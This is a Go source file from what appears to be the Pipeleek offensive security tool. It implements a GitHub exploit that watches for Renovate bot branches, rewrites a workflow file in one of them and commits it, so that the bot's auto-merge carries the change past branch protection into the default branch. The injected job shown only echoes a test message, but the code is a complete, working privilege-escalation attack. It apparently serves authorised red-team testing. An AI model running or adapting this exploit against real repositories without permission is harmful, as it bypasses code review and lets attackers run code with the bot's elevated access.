package renovate

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
	"github.com/google/go-github/v69/github"
	"github.com/rhysd/actionlint"
	"github.com/rs/zerolog/log"
	"gopkg.in/yaml.v3"
)

type repoRef struct {
	owner string
	repo  string
}

func newRepoRef(repoName string) *repoRef {
	parts := strings.Split(repoName, "/")
	if len(parts) != 2 {
		log.Fatal().Str("repoName", repoName).Msg("Repository name must be in format owner/repo")
	}
	return &repoRef{owner: parts[0], repo: parts[1]}
}

// RunExploit performs the Renovate privilege escalation exploit on GitHub.
func RunExploit(client *github.Client, repoName, renovateBranchesRegex, monitoringIntervalStr string) {
	ctx := context.Background()

	log.Info().Msg("Ensure the Renovate bot has greater write access than you, otherwise this will not work, and is able to auto merge into the protected main branch")

	ref := newRepoRef(repoName)
	repository, _, err := client.Repositories.Get(ctx, ref.owner, ref.repo)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve repository information")
	}

	branchMonitor, err := pkgrenovate.NewBranchMonitor(renovateBranchesRegex)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex is invalid")
	}

	monitoringInterval, err := time.ParseDuration(monitoringIntervalStr)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("interval", monitoringIntervalStr).Msg("Failed to parse monitoring-interval duration")
	}

	if repository.GetDisabled() || repository.GetArchived() {
		log.Fatal().Msg("Repository is disabled or archived, GitHub Actions cannot run")
	}

	workflowPaths := fetchWorkflowFiles(ctx, client, ref.owner, ref.repo)
	if len(workflowPaths) == 0 {
		log.Fatal().Msg("No GitHub Actions workflows found, auto merging is impossible")
	}

	checkDefaultBranchProtections(ctx, client, ref, repository)
	branch := monitorBranches(ctx, client, ref, branchMonitor, monitoringInterval)

	log.Debug().Str("branch", branch.GetName()).Msg("Fetching workflow from Renovate branch")
	workflowContent := getWorkflowYAML(ctx, client, ref, branch.GetName(), workflowPaths[0])

	originalWorkflowYaml, err := yaml.Marshal(workflowContent)
	if err != nil {
		log.Warn().Err(err).Msg("Failed to marshal original workflow for validation")
	} else {
		validateWorkflowYAML(workflowPaths[0], originalWorkflowYaml, "original")
	}

	log.Debug().Str("branch", branch.GetName()).Msg("Modifying workflow configuration")
	if workflowContent["jobs"] == nil {
		workflowContent["jobs"] = make(map[string]interface{})
	}

	jobs := workflowContent["jobs"].(map[string]interface{})
	jobs["pipeleek-renovate-privesc"] = map[string]interface{}{
		"runs-on": "ubuntu-latest",
		"steps": []map[string]interface{}{
			{
				"name": "Pipeleek Renovate Privilege Escalation Test",
				"run":  "echo 'This is a test job for Pipeleek Renovate Privilege Escalation exploit'",
			},
		},
	}

	updateWorkflowYAML(ctx, client, ref, branch.GetName(), workflowPaths[0], workflowContent)
	pkgrenovate.LogExploitInstructions(branch.GetName(), repository.GetDefaultBranch())
	listBranchPRs(ctx, client, ref, branch, repository.GetDefaultBranch())
}

func checkDefaultBranchProtections(ctx context.Context, client *github.Client, ref *repoRef, repo *github.Repository) {
	defaultBranch := repo.GetDefaultBranch()
	protection, resp, err := client.Repositories.GetBranchProtection(ctx, ref.owner, ref.repo, defaultBranch)
	if err != nil {
		if resp != nil && resp.StatusCode == 404 {
			log.Warn().Str("branch", defaultBranch).Msg("Default branch is not protected, you might have direct push access")
			return
		}
		log.Error().Err(err).Msg("Failed to check if the default branch is protected")
		return
	}

	if protection.GetRequiredPullRequestReviews() == nil && protection.GetRequireLinearHistory() == nil {
		log.Warn().Str("branch", defaultBranch).Msg("Default branch has minimal protections, you might already have direct access")
	} else {
		log.Info().Str("branch", defaultBranch).Msg("Default branch is protected, proceeding with exploit")
	}
}

func monitorBranches(ctx context.Context, client *github.Client, ref *repoRef, branchMonitor *pkgrenovate.BranchMonitor, monitoringInterval time.Duration) *github.Branch {
	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
	isFirstScan := true

	for {
		log.Debug().Msg("Checking for new branches created by Renovate Bot")
		branches, _, err := client.Repositories.ListBranches(ctx, ref.owner, ref.repo, &github.BranchListOptions{
			ListOptions: github.ListOptions{PerPage: 100},
		})

		if err != nil {
			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
			time.Sleep(pkgrenovate.GetRetryInterval())
			continue
		}

		if isFirstScan {
			log.Debug().Msg("Storing original branches for comparison")
			if len(branches) == 100 {
				log.Warn().Msg("More than 100 branches found, new branches might not be detected")
			}
		}

		for _, branch := range branches {
			if branchMonitor.CheckBranch(branch.GetName(), isFirstScan) {
				return branch
			}
		}

		isFirstScan = false
		time.Sleep(monitoringInterval)
	}
}

func fetchWorkflowFiles(ctx context.Context, client *github.Client, owner, repo string) []string {
	_, dirContents, _, err := client.Repositories.GetContents(ctx, owner, repo, ".github/workflows", nil)
	if err != nil {
		return nil
	}

	var workflowPaths []string
	for _, content := range dirContents {
		if content.GetType() == "file" && (strings.HasSuffix(content.GetName(), ".yml") || strings.HasSuffix(content.GetName(), ".yaml")) {
			workflowPaths = append(workflowPaths, content.GetPath())
		}
	}

	return workflowPaths
}

func getWorkflowYAML(ctx context.Context, client *github.Client, ref *repoRef, branchName, workflowPath string) map[string]interface{} {
	fileContent, _, _, err := client.Repositories.GetContents(ctx, ref.owner, ref.repo, workflowPath, &github.RepositoryContentGetOptions{
		Ref: branchName,
	})
	if err != nil || fileContent == nil {
		log.Fatal().Str("branch", branchName).Str("workflow", workflowPath).Err(err).Msg("Failed to retrieve workflow file")
	}

	content, err := fileContent.GetContent()
	if err != nil || content == "" {
		log.Fatal().Str("branch", branchName).Str("workflow", workflowPath).Err(err).Msg("Failed to get workflow file content")
	}

	var workflowConfig map[string]interface{}
	err = yaml.Unmarshal([]byte(content), &workflowConfig)
	if err != nil {
		log.Fatal().Str("workflow", workflowPath).Err(err).Msg("Failed to unmarshal workflow configuration")
	}

	return workflowConfig
}

func updateWorkflowYAML(ctx context.Context, client *github.Client, ref *repoRef, branchName, workflowPath string, workflowConfig map[string]interface{}) {
	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Modifying workflow file")

	workflowYaml, err := yaml.Marshal(workflowConfig)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed to marshal workflow configuration")
	}

	validateWorkflowYAML(workflowPath, workflowYaml, "modified")

	var validationCheck map[string]interface{}
	if err := yaml.Unmarshal(workflowYaml, &validationCheck); err != nil {
		log.Fatal().Stack().Err(err).Msg("Generated workflow YAML is invalid")
	}
	if jobs, ok := validationCheck["jobs"].(map[string]interface{}); !ok || jobs == nil {
		log.Fatal().Msg("Generated workflow YAML is missing or has invalid 'jobs' section")
	}

	fileContent, _, _, err := client.Repositories.GetContents(ctx, ref.owner, ref.repo, workflowPath, &github.RepositoryContentGetOptions{
		Ref: branchName,
	})
	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to get current workflow file")
	}

	opts := &github.RepositoryContentFileOptions{
		Message: github.Ptr("Update workflow for Pipeleek Renovate Privilege Escalation exploit"),
		Content: workflowYaml,
		Branch:  github.Ptr(branchName),
		SHA:     fileContent.SHA,
	}

	_, _, err = client.Repositories.UpdateFile(ctx, ref.owner, ref.repo, workflowPath, opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branchName).Msg("Failed to update workflow file")
	}

	log.Info().Str("branch", branchName).Str("file", workflowPath).Msg("Updated remote workflow file")
}

// validateWorkflowYAML validates a GitHub Actions workflow YAML file using actionlint.
// Logs warnings for issues found but doesn't fail on them, except for initialization/execution errors.
// The label parameter ("original" or "modified") indicates the context for logging.
func validateWorkflowYAML(workflowPath string, workflowYaml []byte, label string) {
	linter, project, lErr := safeNewActionLinter()
	if lErr != nil {
		log.Fatal().Err(lErr).Str("workflow", label).Msg("Failed to initialize actionlint for workflow validation")
	}
	defer func() {
		if project != nil {
			os.RemoveAll(project.RootDir())
		}
	}()

	if errs, err := linter.Lint(workflowPath, workflowYaml, project); err != nil {
		log.Fatal().Err(err).Str("workflow", label).Msg("Failed to lint workflow YAML")
	} else if len(errs) > 0 {
		logEvent := log.Warn().Int("errorCount", len(errs)).Str("workflow", label)
		if label == "original" {
			logEvent.Msg("Original workflow file has validation issues - proceeding anyway")
		} else {
			logEvent.Msg("Modified workflow YAML has linting issues")
		}
		for _, e := range errs {
			log.Warn().Str("issue", e.Error()).Str("workflow", label).Msg("Actionlint validation issue")
		}
	} else {
		log.Debug().Str("workflow", label).Msg("Workflow YAML passed actionlint validation")
	}
}

// safeNewActionLinter creates a properly initialized actionlint Linter with a temporary project context.
// Returns a temporary project directory that MUST be cleaned up by the caller.
// Recovers from panics in actionlint initialization to provide robust error handling.
func safeNewActionLinter() (l *actionlint.Linter, proj *actionlint.Project, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("actionlint.NewLinter panicked: %v", r)
			l = nil
			proj = nil
		}
	}()
	
	// Create temporary directory with proper project structure for actionlint initialization
	// This prevents nil pointer dereferences when actionlint auto-detects project settings
	tmpDir, err := os.MkdirTemp("", "actionlint-*")
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create temp directory: %w", err)
	}
	
	workflowsDir := filepath.Join(tmpDir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		os.RemoveAll(tmpDir)
		return nil, nil, fmt.Errorf("failed to create workflows directory: %w", err)
	}
	
	project, err := actionlint.NewProject(tmpDir)
	if err != nil {
		os.RemoveAll(tmpDir)
		return nil, nil, fmt.Errorf("failed to create actionlint project: %w", err)
	}
	
	opts := &actionlint.LinterOptions{
		LogWriter: io.Discard,
	}
	linter, err := actionlint.NewLinter(io.Discard, opts)
	if err != nil {
		os.RemoveAll(tmpDir)
		return nil, nil, fmt.Errorf("failed to create linter: %w", err)
	}
	
	return linter, project, nil
}

func listBranchPRs(ctx context.Context, client *github.Client, ref *repoRef, branch *github.Branch, defaultBranch string) {
	branchName := branch.GetName()
	opts := &github.PullRequestListOptions{
		Head: fmt.Sprintf("%s:%s", ref.owner, branchName),
		Base: defaultBranch,
	}

	prs, _, err := client.PullRequests.List(ctx, ref.owner, ref.repo, opts)
	if err != nil {
		log.Error().Err(err).Msg("Failed to list pull requests for branch, go check manually")
		return
	}

	if len(prs) == 0 {
		log.Info().Str("branch", branchName).Msg("No pull requests found yet for this branch")
		return
	}

	for _, pr := range prs {
		log.Info().Str("pr", pr.GetTitle()).Str("url", pr.GetHTMLURL()).Msg("Found pull request for targeted branch")
	}
}
